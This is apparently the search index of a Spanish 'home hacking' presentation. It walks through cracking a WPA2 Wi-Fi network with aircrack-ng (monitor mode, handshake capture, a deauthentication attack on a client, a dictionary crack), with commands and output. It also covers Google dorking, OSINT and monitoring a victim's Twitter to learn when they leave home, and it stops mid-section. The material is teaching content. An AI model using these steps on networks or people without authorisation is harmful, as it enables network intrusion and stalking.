{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hacking Dom\u00e9stico Disclaimer Esta presentaci\u00f3n tiene fines educativos. Ninguna de las t\u00e9cnicas mostradas durante esta presentaci\u00f3n tiene fin de inducir al ataque. La presentaci\u00f3n puede ser distribuida y modificada libremente por cualquiera.","title":"Index"},{"location":"#hacking-domestico","text":"","title":"Hacking Dom\u00e9stico"},{"location":"#disclaimer","text":"Esta presentaci\u00f3n tiene fines educativos. Ninguna de las t\u00e9cnicas mostradas durante esta presentaci\u00f3n tiene fin de inducir al ataque. La presentaci\u00f3n puede ser distribuida y modificada libremente por cualquiera.","title":"Disclaimer"},{"location":"crackingWifi/","text":"Vulnerabilidades en redes wifi Como se ha detallado en el apartado anterior encontramos diferentes aspectos dentro de una red wifi que deben de ser analizados. Para realizar an\u00e1lisis de redes wifi disponemos de la suite Aircrack-ng , la cual nos brinda numerosas herramientas para poder realizar dicho an\u00e1lisis. \u00bfQu\u00e9 es el modo monitor? Antes de entrar en materia, es necesario introducir un concepto nuevo en el \u00e1mbito de las redes wifi: monitor mode . Haciendo una simple b\u00fasqueda en Wikipedia encontramos: Monitor mode, or RFMON (Radio Frequency MONitor) mode, allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel. Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point or ad hoc network first Traduciendo al espa\u00f1ol (la parte que nos interesa) concluimos que el modo monitor nos permite capturar paquetes sin necesidad de estar asociado a un punto de acceso. Esta funcionalidad que nos permiten determinadas chips de tarjetas wifi ser\u00e1 esencial para analizar las diferentes redes de nuestro entorno. \u00bfC\u00f3mo comprobar si la tarjeta es compatible? Una vez que ha quedado claro que es el modo monitor y para que sirve, se recomienda utilizar tarjetas externas por dos razones principales: El chipset de las tarjetas externas brindan mejor soporte para modo monitor. La tarjeta wifi interna puede ser da\u00f1ada debido al procesamiento de paquetes. Dicho esto, lo primero que tenemos que realizar ser\u00eda comprobar que tenemos una tarjeta que soporte el modo monitor, para ello utilizaremos el siguiente comando: $ iw list Dentro de la salida extensa de este comando tenemos la categoria Supported interface modes donde podemos comprobar si se incluye el modo monitor. Activando el modo monitor: airmon-ng Una vez comprobado si la tarjeta es compatible, pasaremos a ponerla el modo monitor. Aircrack-ng requiere ser ejecutado como root Para los ejemplos de comandos se utilizar\u00e1 la interfaz wlan1, esto debe de ser cambiado seg\u00fan la interfaz $ root@HowIsCoding:~$ airmon-ng check wlan1 Found 5 processes that could cause trouble. Kill them using 'airmon-ng check kill' before putting the card in monitor mode, they will interfere by changing channels and sometimes putting the interface back in managed mode PID Name 5771 dhclient 7888 wpa_supplicant 8878 NetworkManager 9214 avahi-daemon 9225 avahi-daemon Antes de poner la interfaz en modo monitor debemos de realizar una comprobaci\u00f3n en busca de procesos (como el network Manager) que esten utilizando la interfaz, de forma que tendremos que matarlos. Si dejamos estos procesos corriendo pueden realizar acciones como cambiar la antena de canal o impedirla trabajar el modo monitor. Para matar estos procesos simplemente usamos la herramienta airmon-ng para matarlos: $ airmon-ng check kill Cuando tenemos los procesos que entraban en conflicto matados podemos pasar a poner la interfaz en modo monitor, para ello usaremos la misma herramienta: $ airmon-ng start wlan1 PHY Interface Driver Chipset phy0 wlan1 ath9k_htc Atheros Communications, Inc. AR9271 802.11n (mac80211 monitor mode vif enabled for [phy0]wlan1 on [phy0]wlan1mon) (mac80211 station mode vif disabled for [phy0]wlan1) Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el momo monitor se habilita la interfaz wlan1mon. Podemos comprobar los canales Wifi en los que esta ecuchando nuestra tarjeta en modo monitor, para ello podemos usar el comando: $ iwlist wlan1mon channel Cuando hemos encontrado la red que queremos auditar (como se explicar\u00e1 en el siguiente apartado), podemos suministrar el canal como argumento opcional a airmon-ng, de la siguiente forma: $ airmon-ng start wlan1 3 Al igual que podemos poner la tarjeta en modo monitor, cuando terminemos de trabajar con ella debemos desactivarla, para ello airmon-ng nos permite desactivarlo haciendo uso del comando: $ airmon-ng stop wlan1 Escaneando redes wifi: airodump-ng Una vez con nuestra interfaz en modo monitor pasaremos a realizar un escaneo de todas las redes wifi que estan en nuestro entorno, para ello utilizaremos la herramienta airodump-ng $ airodump-ng wlan1mon CH 12 ][ Elapsed: 12 s ][ 2019-01-13 13:34 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID AA:5D:17:03:35:FC -41 33 0 0 7 54 WPA2 CCMP PSK RaspberryPI 7C:8B:CA:6C:85:80 -42 21 100 40 4 54 WPA2 CCMP PSK TP-Link_8580 A4:08:F5:E6:23:06 -57 13 0 0 11 54 WPA2 CCMP PSK vodafone2300 94:6A:B0:CB:6F:EA -62 19 80 0 4 54 WPA2 CCMP PSK MiFibra-6FE8 F8:FB:56:28:37:01 -69 1 3 0 7 54 WPA2 CCMP PSK micasa 44:48:C1:0F:0B:01 -72 5 0 0 11 54 WPA2 CCMP MGT VECTORITC-CORPORATI 78:29:ED:83:11:BF -73 8 0 0 11 54 WPA2 CCMP PSK MOVISTAR_11BE 44:48:C1:0F:0B:00 -73 7 0 0 11 54 WPA2 CCMP MGT VECTORITC-COLABORAD 44:48:C1:0F:0B:02 -73 7 0 0 11 54 OPN VECTORITC-INVITADOS B0:4E:26:1D:93:57 -74 2 0 0 6 54 WPA2 CCMP PSK TP-Link_9358 EC:08:6B:AB:77:F0 -75 4 0 0 3 54 WPA2 CCMP PSK TP-LINK_77F0 F4:F2:6D:2C:58:99 -83 1 2 0 9 54 WPA2 CCMP PSK Ororo _EXT F4:F2:6D:EC:C4:71 -83 0 22 0 10 -1 WPA <length: 0> 00:16:0A:13:DB:42 -85 5 0 0 11 54 . WPA2 CCMP PSK RAFAELA BSSID STATION PWR Rate Lost Frames Probe 7C:8B:CA:6C:85:80 10:02:B5:8A:95:26 -1 0e- 0 0 100 94:6A:B0:CB:6F:EA 7C:8B:CA:6C:85:81 -29 5e- 0e 0 76 F8:FB:56:28:37:01 E4:0E:EE:44:DF:24 -72 1e- 1 0 4 EC:08:6B:AB:77:F0 4C:74:03:70:7C:3A -85 0 - 6 0 1 ` La terminolog\u00eda usada en el resultado de este comando esta explicada en el apartado anterior Airodump-ng realizar\u00e1 un escaneo por todos los canales de radio referentes a las redes wifi e ir\u00e1 buscando las diferentes se\u00f1ales y los clientes conectados a la mismas. Este resultado nos ser\u00e1 \u00fatil para identificar todas las se\u00f1ales wifi de nuestro entorno, as\u00ed como los cientes conectados a estas. Tenemos que tener en cuenta que si un punto de acceso tiene clientes conectados, el proceso de obtenci\u00f3n de la contrase\u00f1a ser\u00e1 m\u00e1s f\u00e1cil de realizar. Limitando el rango de b\u00fasqueda En el anterior ejemplo estabamos haciendo una captura de todos los canales wifi, de forma que nuestra interfaz (en modo monitor) iba cambiando constantemente de canal para encontrar los clientes y puntos de acceso de cada canal. Sin embargo, cuando estamos trabando con un objetivo en concretp tenemos que capturar informaci\u00f3n exclusivamente de dicho AP para ello tenemos que especificar su direcci\u00f3n MAC(bssid) y Canal en el que emite podemos obtener mayor informaci\u00f3n de esta red, indicaremos tambi\u00e9n un fichero donde almacenar la informaci\u00f3n que capturemos, de forma que el handsake quede almacenado para posteior tratamiento. $ airodump-ng --bssid 7C:8B:CA:6C:85:80 -c 4 -w capture wlan1mon Este comando nos dar\u00e1 como resultado un paquete cap (capture.cap) para analizar posteriormente. Tenemos que esperar hasta que capturemos el handsake, es decir, tenemos que esperar hasta que un cliente se conecte al punto de acceso y por ende comience el proceso de autenticaci\u00f3n descrito anteriormente. $ CH 4 ][ Elapsed: 30 s ][ 2019-01-13 13:46 ][ WPA handshake: 7C:8B:CA:6C:85:80 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 7C:8B:CA:6C:85:80 -34 57 303 12529 816 4 54 WPA2 CCMP PSK TP-Link_8580 BSSID STATION PWR Rate Lost Frames Probe 7C:8B:CA:6C:85:80 CC:9F:7A:1D:02:27 -35 0e- 0e 108 317 TP-Link_8580 7C:8B:CA:6C:85:80 10:02:B5:8A:95:26 -42 0e- 6e 0 12360 En este momento hemos obtenido el handsake referente al AP, de forma que podemos detener la captura de paquetes. Generando tr\u00e1fico Wifi: aireplay-ng aireplay-ng es una herramienta dentro de la suite que nos permite generar tr\u00e1fico para posteiormente utilizarlo en el proceso de craking de contrase\u00f1as WEP o WPA PSK. En nuestro caso, estamos trabajando en una red WPA PSK. Cuando encontramos un cliente conectado a esta red, el proceso de captura de handsake parece imposible (puesto que el handsake se obtiene durante el proceso de autenticaci\u00f3n), por lo cual, tendr\u00edamos que esperar a que el cliente u otro nuevo se conecte, en este punto es donde entra en juego aireplay. Podemos enviar paquetes que permite desautenticar a los clientes de una red, dichos clietnes, posteriormente se ver\u00e1n obligados a conectarse y nosotros capturaremos el handsake. Con aireplay-ng podemos enviar diferente tipo de tr\u00e1fico, sin embargo, como hemos mencionado en nuestro caso nos interesa desauntenticar al usuario, para ello usaremos: $ root@kali:~# aireplay-ng -0 0 -a 7C:8B:CA:6C:85:80 -c CC:9F:7A:1D:02:27 wlan1mon 14:05:50 Waiting for beacon frame (BSSID: 7C:8B:CA:6C:85:80) on channel 4 14:05:51 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [19|65 ACKs] 14:05:51 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|58 ACKs] 14:05:52 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|61 ACKs] 14:05:53 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|66 ACKs] En este comando, estamos especificando los siguientes par\u00e1metros: -0 0 --> Indicamos que es un ataque de desautenticaci\u00f3n. Con 0 indicamos el intervalo de nv\u00edo, en este caso continuamente -a --> Indicamos la direcci\u00f3n MAC del punto de acceso -c --> Indicamos la direcci\u00f3n MAC del cliente para desautenticar Pasando un tiempo, el cliente ser\u00e1 desautenticado y automaticamente intentar\u00e1 volver a conectarse (de forma manual o autom\u00e1tica), ser\u00e1 en ese momento donde podamos caputar el handsake. Obteniendo la contrase\u00f1a: aircrack-ng aircrack-ng es la herramienta que nos permite crackear la contrase\u00f1a, podemos utilizar diferentes m\u00e9todos, en este caso vamos a realizar un ataque por diccionario. Podemos utilizar otros m\u00e9todos como cracking mediante gpu haciendo uso de herramientas como pyrit . $ aircrack-ng -w passwordList capture-01.cap Aircrack-ng 1.5.2 [00:00:00] 2/1 keys tested (25.73 k/s) Time left: 0 seconds 200.00% KEY FOUND! [ $Afmin123 ] Master Key : E3 77 86 87 FB A3 E9 54 77 EC 16 11 56 50 F8 C0 D5 8B 37 2F 0E 16 A7 F1 38 A3 C9 E5 75 AB EE B7 Transient Key : 8D 67 66 D7 74 3D AD A5 76 08 83 91 3C 10 56 49 81 14 B7 68 95 51 3B 2D 2D 25 70 1D D9 31 73 D2 44 DE 8A 54 25 CA F9 AB B6 99 1A 9A 7E D3 D4 25 EC E3 C5 E3 BF 4B 9A 1E 52 48 37 68 DA 8F 32 30 EAPOL HMAC : 79 F3 A9 F9 FA CA 60 C6 4E 45 8C 3D B6 77 0C D2 Tras realizar el ataque, si este ha concluido satisfactoriamente, encontraremos la contrase\u00f1a, as\u00ed como las diferentes claves utilizadas durante el proceso.","title":"Cracking de  redes Wifi"},{"location":"crackingWifi/#vulnerabilidades-en-redes-wifi","text":"Como se ha detallado en el apartado anterior encontramos diferentes aspectos dentro de una red wifi que deben de ser analizados. Para realizar an\u00e1lisis de redes wifi disponemos de la suite Aircrack-ng , la cual nos brinda numerosas herramientas para poder realizar dicho an\u00e1lisis.","title":"Vulnerabilidades en redes wifi"},{"location":"crackingWifi/#que-es-el-modo-monitor","text":"Antes de entrar en materia, es necesario introducir un concepto nuevo en el \u00e1mbito de las redes wifi: monitor mode . Haciendo una simple b\u00fasqueda en Wikipedia encontramos: Monitor mode, or RFMON (Radio Frequency MONitor) mode, allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel. Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point or ad hoc network first Traduciendo al espa\u00f1ol (la parte que nos interesa) concluimos que el modo monitor nos permite capturar paquetes sin necesidad de estar asociado a un punto de acceso. Esta funcionalidad que nos permiten determinadas chips de tarjetas wifi ser\u00e1 esencial para analizar las diferentes redes de nuestro entorno.","title":"\u00bfQu\u00e9 es el modo monitor?"},{"location":"crackingWifi/#como-comprobar-si-la-tarjeta-es-compatible","text":"Una vez que ha quedado claro que es el modo monitor y para que sirve, se recomienda utilizar tarjetas externas por dos razones principales: El chipset de las tarjetas externas brindan mejor soporte para modo monitor. La tarjeta wifi interna puede ser da\u00f1ada debido al procesamiento de paquetes. Dicho esto, lo primero que tenemos que realizar ser\u00eda comprobar que tenemos una tarjeta que soporte el modo monitor, para ello utilizaremos el siguiente comando: $ iw list Dentro de la salida extensa de este comando tenemos la categoria Supported interface modes donde podemos comprobar si se incluye el modo monitor.","title":"\u00bfC\u00f3mo comprobar si la tarjeta es compatible?"},{"location":"crackingWifi/#activando-el-modo-monitor-airmon-ng","text":"Una vez comprobado si la tarjeta es compatible, pasaremos a ponerla el modo monitor. Aircrack-ng requiere ser ejecutado como root Para los ejemplos de comandos se utilizar\u00e1 la interfaz wlan1, esto debe de ser cambiado seg\u00fan la interfaz $ root@HowIsCoding:~$ airmon-ng check wlan1 Found 5 processes that could cause trouble. Kill them using 'airmon-ng check kill' before putting the card in monitor mode, they will interfere by changing channels and sometimes putting the interface back in managed mode PID Name 5771 dhclient 7888 wpa_supplicant 8878 NetworkManager 9214 avahi-daemon 9225 avahi-daemon Antes de poner la interfaz en modo monitor debemos de realizar una comprobaci\u00f3n en busca de procesos (como el network Manager) que esten utilizando la interfaz, de forma que tendremos que matarlos. Si dejamos estos procesos corriendo pueden realizar acciones como cambiar la antena de canal o impedirla trabajar el modo monitor. Para matar estos procesos simplemente usamos la herramienta airmon-ng para matarlos: $ airmon-ng check kill Cuando tenemos los procesos que entraban en conflicto matados podemos pasar a poner la interfaz en modo monitor, para ello usaremos la misma herramienta: $ airmon-ng start wlan1 PHY Interface Driver Chipset phy0 wlan1 ath9k_htc Atheros Communications, Inc. AR9271 802.11n (mac80211 monitor mode vif enabled for [phy0]wlan1 on [phy0]wlan1mon) (mac80211 station mode vif disabled for [phy0]wlan1) Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el momo monitor se habilita la interfaz wlan1mon. Podemos comprobar los canales Wifi en los que esta ecuchando nuestra tarjeta en modo monitor, para ello podemos usar el comando: $ iwlist wlan1mon channel Cuando hemos encontrado la red que queremos auditar (como se explicar\u00e1 en el siguiente apartado), podemos suministrar el canal como argumento opcional a airmon-ng, de la siguiente forma: $ airmon-ng start wlan1 3 Al igual que podemos poner la tarjeta en modo monitor, cuando terminemos de trabajar con ella debemos desactivarla, para ello airmon-ng nos permite desactivarlo haciendo uso del comando: $ airmon-ng stop wlan1","title":"Activando el modo monitor: airmon-ng"},{"location":"crackingWifi/#escaneando-redes-wifi-airodump-ng","text":"Una vez con nuestra interfaz en modo monitor pasaremos a realizar un escaneo de todas las redes wifi que estan en nuestro entorno, para ello utilizaremos la herramienta airodump-ng $ airodump-ng wlan1mon CH 12 ][ Elapsed: 12 s ][ 2019-01-13 13:34 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID AA:5D:17:03:35:FC -41 33 0 0 7 54 WPA2 CCMP PSK RaspberryPI 7C:8B:CA:6C:85:80 -42 21 100 40 4 54 WPA2 CCMP PSK TP-Link_8580 A4:08:F5:E6:23:06 -57 13 0 0 11 54 WPA2 CCMP PSK vodafone2300 94:6A:B0:CB:6F:EA -62 19 80 0 4 54 WPA2 CCMP PSK MiFibra-6FE8 F8:FB:56:28:37:01 -69 1 3 0 7 54 WPA2 CCMP PSK micasa 44:48:C1:0F:0B:01 -72 5 0 0 11 54 WPA2 CCMP MGT VECTORITC-CORPORATI 78:29:ED:83:11:BF -73 8 0 0 11 54 WPA2 CCMP PSK MOVISTAR_11BE 44:48:C1:0F:0B:00 -73 7 0 0 11 54 WPA2 CCMP MGT VECTORITC-COLABORAD 44:48:C1:0F:0B:02 -73 7 0 0 11 54 OPN VECTORITC-INVITADOS B0:4E:26:1D:93:57 -74 2 0 0 6 54 WPA2 CCMP PSK TP-Link_9358 EC:08:6B:AB:77:F0 -75 4 0 0 3 54 WPA2 CCMP PSK TP-LINK_77F0 F4:F2:6D:2C:58:99 -83 1 2 0 9 54 WPA2 CCMP PSK Ororo _EXT F4:F2:6D:EC:C4:71 -83 0 22 0 10 -1 WPA <length: 0> 00:16:0A:13:DB:42 -85 5 0 0 11 54 . WPA2 CCMP PSK RAFAELA BSSID STATION PWR Rate Lost Frames Probe 7C:8B:CA:6C:85:80 10:02:B5:8A:95:26 -1 0e- 0 0 100 94:6A:B0:CB:6F:EA 7C:8B:CA:6C:85:81 -29 5e- 0e 0 76 F8:FB:56:28:37:01 E4:0E:EE:44:DF:24 -72 1e- 1 0 4 EC:08:6B:AB:77:F0 4C:74:03:70:7C:3A -85 0 - 6 0 1 ` La terminolog\u00eda usada en el resultado de este comando esta explicada en el apartado anterior Airodump-ng realizar\u00e1 un escaneo por todos los canales de radio referentes a las redes wifi e ir\u00e1 buscando las diferentes se\u00f1ales y los clientes conectados a la mismas. Este resultado nos ser\u00e1 \u00fatil para identificar todas las se\u00f1ales wifi de nuestro entorno, as\u00ed como los cientes conectados a estas. Tenemos que tener en cuenta que si un punto de acceso tiene clientes conectados, el proceso de obtenci\u00f3n de la contrase\u00f1a ser\u00e1 m\u00e1s f\u00e1cil de realizar.","title":"Escaneando redes wifi: airodump-ng"},{"location":"crackingWifi/#limitando-el-rango-de-busqueda","text":"En el anterior ejemplo estabamos haciendo una captura de todos los canales wifi, de forma que nuestra interfaz (en modo monitor) iba cambiando constantemente de canal para encontrar los clientes y puntos de acceso de cada canal. Sin embargo, cuando estamos trabando con un objetivo en concretp tenemos que capturar informaci\u00f3n exclusivamente de dicho AP para ello tenemos que especificar su direcci\u00f3n MAC(bssid) y Canal en el que emite podemos obtener mayor informaci\u00f3n de esta red, indicaremos tambi\u00e9n un fichero donde almacenar la informaci\u00f3n que capturemos, de forma que el handsake quede almacenado para posteior tratamiento. $ airodump-ng --bssid 7C:8B:CA:6C:85:80 -c 4 -w capture wlan1mon Este comando nos dar\u00e1 como resultado un paquete cap (capture.cap) para analizar posteriormente. Tenemos que esperar hasta que capturemos el handsake, es decir, tenemos que esperar hasta que un cliente se conecte al punto de acceso y por ende comience el proceso de autenticaci\u00f3n descrito anteriormente. $ CH 4 ][ Elapsed: 30 s ][ 2019-01-13 13:46 ][ WPA handshake: 7C:8B:CA:6C:85:80 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 7C:8B:CA:6C:85:80 -34 57 303 12529 816 4 54 WPA2 CCMP PSK TP-Link_8580 BSSID STATION PWR Rate Lost Frames Probe 7C:8B:CA:6C:85:80 CC:9F:7A:1D:02:27 -35 0e- 0e 108 317 TP-Link_8580 7C:8B:CA:6C:85:80 10:02:B5:8A:95:26 -42 0e- 6e 0 12360 En este momento hemos obtenido el handsake referente al AP, de forma que podemos detener la captura de paquetes.","title":"Limitando el rango de b\u00fasqueda"},{"location":"crackingWifi/#generando-trafico-wifi-aireplay-ng","text":"aireplay-ng es una herramienta dentro de la suite que nos permite generar tr\u00e1fico para posteiormente utilizarlo en el proceso de craking de contrase\u00f1as WEP o WPA PSK. En nuestro caso, estamos trabajando en una red WPA PSK. Cuando encontramos un cliente conectado a esta red, el proceso de captura de handsake parece imposible (puesto que el handsake se obtiene durante el proceso de autenticaci\u00f3n), por lo cual, tendr\u00edamos que esperar a que el cliente u otro nuevo se conecte, en este punto es donde entra en juego aireplay. Podemos enviar paquetes que permite desautenticar a los clientes de una red, dichos clietnes, posteriormente se ver\u00e1n obligados a conectarse y nosotros capturaremos el handsake. Con aireplay-ng podemos enviar diferente tipo de tr\u00e1fico, sin embargo, como hemos mencionado en nuestro caso nos interesa desauntenticar al usuario, para ello usaremos: $ root@kali:~# aireplay-ng -0 0 -a 7C:8B:CA:6C:85:80 -c CC:9F:7A:1D:02:27 wlan1mon 14:05:50 Waiting for beacon frame (BSSID: 7C:8B:CA:6C:85:80) on channel 4 14:05:51 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [19|65 ACKs] 14:05:51 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|58 ACKs] 14:05:52 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|61 ACKs] 14:05:53 Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|66 ACKs] En este comando, estamos especificando los siguientes par\u00e1metros: -0 0 --> Indicamos que es un ataque de desautenticaci\u00f3n. Con 0 indicamos el intervalo de nv\u00edo, en este caso continuamente -a --> Indicamos la direcci\u00f3n MAC del punto de acceso -c --> Indicamos la direcci\u00f3n MAC del cliente para desautenticar Pasando un tiempo, el cliente ser\u00e1 desautenticado y automaticamente intentar\u00e1 volver a conectarse (de forma manual o autom\u00e1tica), ser\u00e1 en ese momento donde podamos caputar el handsake.","title":"Generando tr\u00e1fico Wifi: aireplay-ng"},{"location":"crackingWifi/#obteniendo-la-contrasena-aircrack-ng","text":"aircrack-ng es la herramienta que nos permite crackear la contrase\u00f1a, podemos utilizar diferentes m\u00e9todos, en este caso vamos a realizar un ataque por diccionario. Podemos utilizar otros m\u00e9todos como cracking mediante gpu haciendo uso de herramientas como pyrit . $ aircrack-ng -w passwordList capture-01.cap Aircrack-ng 1.5.2 [00:00:00] 2/1 keys tested (25.73 k/s) Time left: 0 seconds 200.00% KEY FOUND! [ $Afmin123 ] Master Key : E3 77 86 87 FB A3 E9 54 77 EC 16 11 56 50 F8 C0 D5 8B 37 2F 0E 16 A7 F1 38 A3 C9 E5 75 AB EE B7 Transient Key : 8D 67 66 D7 74 3D AD A5 76 08 83 91 3C 10 56 49 81 14 B7 68 95 51 3B 2D 2D 25 70 1D D9 31 73 D2 44 DE 8A 54 25 CA F9 AB B6 99 1A 9A 7E D3 D4 25 EC E3 C5 E3 BF 4B 9A 1E 52 48 37 68 DA 8F 32 30 EAPOL HMAC : 79 F3 A9 F9 FA CA 60 C6 4E 45 8C 3D B6 77 0C D2 Tras realizar el ataque, si este ha concluido satisfactoriamente, encontraremos la contrase\u00f1a, as\u00ed como las diferentes claves utilizadas durante el proceso.","title":"Obteniendo la contrase\u00f1a: aircrack-ng"},{"location":"informationGathering/","text":"Recolecci\u00f3n de informaci\u00f3n \u00bfQu\u00e9 podemos definir como recolecci\u00f3n de informaci\u00f3n? Como su propio nombre indica consiste en obtener informaci\u00f3n sobre el sistema que vamos a atacar, sin embargo, tenemos que hacer una distintici\u00f3n entre: Pasive Footprinting o recolecci\u00f3n pasiva de informaci\u00f3n: Este proceso consiste en consultar informaci\u00f3n p\u00fablica en internet relacionada con la infraestructura que estamos atacando Active Footprinting o recolecci\u00f3n activa de informaci\u00f3: Este proceso consiste en interactuar directamente con los dispostivos de la empresa, de forma que se puedan obtener protocolos, puertos de conexi\u00f3n, entre otros. Passive Footprinting: Hacking con buscadores La recolecci\u00f3n pasiva de informaci\u00f3n se basa principalmente en la b\u00fasqueda de informaci\u00f3n sobre la empresa utilizando recursos como la informaci\u00f3n del domino (resultado de whois ). Sin embargo, con el objetivo que tenemos en esta presentaci\u00f3n, nos centraremos en otra t\u00e9cnica de passive footprinting, esta es el hacking con buscadores . El hacking con buscadores consiste en un conjunto de t\u00e9cnicas que nos permiten encontrar informaci\u00f3n m\u00e1s precisa haciendo uso de los operadores de los buscadores. Esta t\u00e9cnica es conocida como Google Hacking o Google dorking. A pesar de las b\u00fasquedas aparentemente exactas que nos ofrece Google buscando sobre cualquier tema, podemos encontrar ciertos operadores que nos permiten encontrar informaci\u00f3n m\u00e1s precisa. Un claro ejemplo de esto ser\u00eda encontrar todos los documentos de un determinado dominio o encontrar informaci\u00f3n de una misma persona en diferentes redes sociales. Un objetivo a considerar del hacking con buscadores consiste en reducir el n\u00famero de resultados de forma que analizar dicho contenido no suponga muzho esfuerzo (ni humano ni computacional). Para poder aplicar esta t\u00e9cnica en primer lugar tenemos que conocer los operadores de b\u00fasqueda que nos ofrece Google, los cuales se muestran a conituaci\u00f3n. Con los operadores mostrados anteriormente podemos conformar los llamados dorks que son combinaciones de operadores que nos permiten encontrar informaci\u00f3n sensible de diferente car\u00e1cter. Podemos encontrar gran cantidad de dork en el Google Hacking Database OSINT (Open Source Intelligence ) Podemos definir OSINT en espa\u00f1ol como inteligencia de fuentes abiertas. Con esta esqueta traducci\u00f3n nos podemos hacer una muy ligera idea, de lo que supone este t\u00e9rmino. Con OSINT nos referimos a la informaci\u00f3n que existe p\u00fablica en la red (incluyendo la Deep Web ), siendo esta informaci\u00f3n p\u00fablica,gratuita y desclasificada. El matiz que diferencias la fuentes OSINT es que son fuentes utilizadas para crear inteligencia La importancia de las fuentes OSINT radica en que nos permite crear inteligencia que nos permita tomar decisiones en m\u00faltiples situaciones. En base a la informaci\u00f3n recogida podr\u00e9mos decidir nuestra forma de actuar. Existen diversas herramientas OSINT como maltego, que nos proporcionan m\u00faltiples funcionalidades, sin embargo, estas herramientas suelen ser de pago y los resultados est\u00e1n limitados. Obteniendo informaci\u00f3n de Twitter: tweepy Como alternativa para este escenario hemos decidio utilizar una biblioteca de Python llamada Tweepy que nos permite realizar consultas a la API de Twitter y de esta forma obtener informaci\u00f3n relacionada con dicha red social. \u00bfQu\u00e9 pretendemos lograr con este script? La respuesta es muy simple, podemos estar monitoreando la cuenta de la victima para conocer sus publicaciones, con estas publicaciones podremos obtener informaci\u00f3n como horarios de salida, dispositivos que utiliza entre otras. En escenarios mas complejos, podemos utilizar librerias de procesamiento de lenguaje natural (NTPL) entre otras para poder extraer la m\u00e1xima informaci\u00f3n posible, sin embargo, para este ejemplo las obviaremos. Script monitorizaci\u00f3n Twitter","title":"Recolecci\u00f3n de informaci\u00f3n"},{"location":"informationGathering/#recoleccion-de-informacion","text":"","title":"Recolecci\u00f3n de informaci\u00f3n"},{"location":"informationGathering/#que-podemos-definir-como-recoleccion-de-informacion","text":"Como su propio nombre indica consiste en obtener informaci\u00f3n sobre el sistema que vamos a atacar, sin embargo, tenemos que hacer una distintici\u00f3n entre: Pasive Footprinting o recolecci\u00f3n pasiva de informaci\u00f3n: Este proceso consiste en consultar informaci\u00f3n p\u00fablica en internet relacionada con la infraestructura que estamos atacando Active Footprinting o recolecci\u00f3n activa de informaci\u00f3: Este proceso consiste en interactuar directamente con los dispostivos de la empresa, de forma que se puedan obtener protocolos, puertos de conexi\u00f3n, entre otros.","title":"\u00bfQu\u00e9 podemos definir como recolecci\u00f3n de informaci\u00f3n?"},{"location":"informationGathering/#passive-footprinting-hacking-con-buscadores","text":"La recolecci\u00f3n pasiva de informaci\u00f3n se basa principalmente en la b\u00fasqueda de informaci\u00f3n sobre la empresa utilizando recursos como la informaci\u00f3n del domino (resultado de whois ). Sin embargo, con el objetivo que tenemos en esta presentaci\u00f3n, nos centraremos en otra t\u00e9cnica de passive footprinting, esta es el hacking con buscadores . El hacking con buscadores consiste en un conjunto de t\u00e9cnicas que nos permiten encontrar informaci\u00f3n m\u00e1s precisa haciendo uso de los operadores de los buscadores. Esta t\u00e9cnica es conocida como Google Hacking o Google dorking. A pesar de las b\u00fasquedas aparentemente exactas que nos ofrece Google buscando sobre cualquier tema, podemos encontrar ciertos operadores que nos permiten encontrar informaci\u00f3n m\u00e1s precisa. Un claro ejemplo de esto ser\u00eda encontrar todos los documentos de un determinado dominio o encontrar informaci\u00f3n de una misma persona en diferentes redes sociales. Un objetivo a considerar del hacking con buscadores consiste en reducir el n\u00famero de resultados de forma que analizar dicho contenido no suponga muzho esfuerzo (ni humano ni computacional). Para poder aplicar esta t\u00e9cnica en primer lugar tenemos que conocer los operadores de b\u00fasqueda que nos ofrece Google, los cuales se muestran a conituaci\u00f3n. Con los operadores mostrados anteriormente podemos conformar los llamados dorks que son combinaciones de operadores que nos permiten encontrar informaci\u00f3n sensible de diferente car\u00e1cter. Podemos encontrar gran cantidad de dork en el Google Hacking Database","title":"Passive Footprinting: Hacking con buscadores"},{"location":"informationGathering/#osint-open-source-intelligence","text":"Podemos definir OSINT en espa\u00f1ol como inteligencia de fuentes abiertas. Con esta esqueta traducci\u00f3n nos podemos hacer una muy ligera idea, de lo que supone este t\u00e9rmino. Con OSINT nos referimos a la informaci\u00f3n que existe p\u00fablica en la red (incluyendo la Deep Web ), siendo esta informaci\u00f3n p\u00fablica,gratuita y desclasificada. El matiz que diferencias la fuentes OSINT es que son fuentes utilizadas para crear inteligencia La importancia de las fuentes OSINT radica en que nos permite crear inteligencia que nos permita tomar decisiones en m\u00faltiples situaciones. En base a la informaci\u00f3n recogida podr\u00e9mos decidir nuestra forma de actuar. Existen diversas herramientas OSINT como maltego, que nos proporcionan m\u00faltiples funcionalidades, sin embargo, estas herramientas suelen ser de pago y los resultados est\u00e1n limitados.","title":"OSINT (Open Source Intelligence )"},{"location":"informationGathering/#obteniendo-informacion-de-twitter-tweepy","text":"Como alternativa para este escenario hemos decidio utilizar una biblioteca de Python llamada Tweepy que nos permite realizar consultas a la API de Twitter y de esta forma obtener informaci\u00f3n relacionada con dicha red social. \u00bfQu\u00e9 pretendemos lograr con este script? La respuesta es muy simple, podemos estar 